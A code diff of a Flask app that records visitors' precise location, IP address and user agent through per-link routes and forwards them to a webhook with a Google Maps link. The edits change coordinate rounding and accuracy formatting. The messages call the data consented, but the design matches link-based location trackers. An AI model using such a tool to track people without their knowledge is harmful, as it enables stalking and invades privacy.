@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, redirect, url_for, session
-import sqlite3, os, uuid, time, requests
+import sqlite3, uuid, time, requests
 import flask.cli
 import subprocess
 import logging, warnings
@@ -85,22 +85,25 @@ def go(link_id):
 @app.route('/location/<link_id>', methods=['POST'])
 def location(link_id):
     data = request.get_json(force=True)
-    lat = data.get('lat')
-    lon = data.get('lon')
-    acc = data.get('acc')
+    lat = round(data.get('lat', 0), 7)  # 7 décimales pour précision maximale
+    lon = round(data.get('lon', 0), 7)
+    acc = round(data.get('acc', 2))     # précision en mètres
     ua = data.get('ua','')
     ip = request.remote_addr
+
     con=sqlite3.connect(DB)
     cur=con.cursor()
     cur.execute("INSERT INTO events(link_id,ts,ip,ua,lat,lon,acc) VALUES (?,?,?,?,?,?,?)",
                 (link_id,int(time.time()),ip,ua,lat,lon,acc))
     con.commit()
+
     cur.execute("SELECT webhook,label FROM links WHERE id=?",(link_id,))
     row=cur.fetchone()
     con.close()
+
     if row:
         webhook,label=row
-        content=f"📍 Position consentie\nLabel: {label}\nIP: {ip}\nUA: {ua}\nLat/Lon: {lat},{lon} (±{int(acc)}m)\nMaps: https://www.google.com/maps?q={lat},{lon}"
+        content=f"📍 Position consentie\nLabel: {label}\nIP: {ip}\nUA: {ua}\nLat/Lon: {lat},{lon} (±{acc}m)\nMaps: https://www.google.com/maps?q={lat},{lon}"
         try:
             requests.post(webhook, json={"content": content}, timeout=8)
         except:
